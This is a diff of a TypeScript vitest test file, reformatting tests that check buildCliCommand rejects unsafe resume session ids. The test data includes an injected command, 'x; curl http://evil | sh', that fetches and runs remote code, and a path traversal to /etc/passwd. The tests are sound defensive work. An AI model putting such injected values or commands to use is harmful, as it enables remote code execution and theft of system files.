@@ -1,4 +1,4 @@
-import { describe, it, expect } from "vitest";
+import { describe, expect, it } from "vitest";
 import { buildCliCommand } from "@/lib/terminal";
 
 describe("buildCliCommand resume-id safety", () => {
@@ -10,15 +10,15 @@ describe("buildCliCommand resume-id safety", () => {
   it("rejects a resume id containing shell metacharacters", () => {
     // An attacker-planted transcript could carry such a sessionId; buildCliCommand
     // must refuse rather than let it reach the shell PTY.
-    expect(() =>
-      buildCliCommand("Claude", undefined, "x; curl http://evil | sh"),
-    ).toThrow(/unsafe resume session id/i);
+    expect(() => buildCliCommand("Claude", undefined, "x; curl http://evil | sh")).toThrow(
+      /unsafe resume session id/i,
+    );
   });
 
   it("rejects a resume id with a path traversal", () => {
-    expect(() =>
-      buildCliCommand("Claude", undefined, "../../etc/passwd"),
-    ).toThrow(/unsafe resume session id/i);
+    expect(() => buildCliCommand("Claude", undefined, "../../etc/passwd")).toThrow(
+      /unsafe resume session id/i,
+    );
   });
 
   it("builds a normal command when no resume id is given", () => {
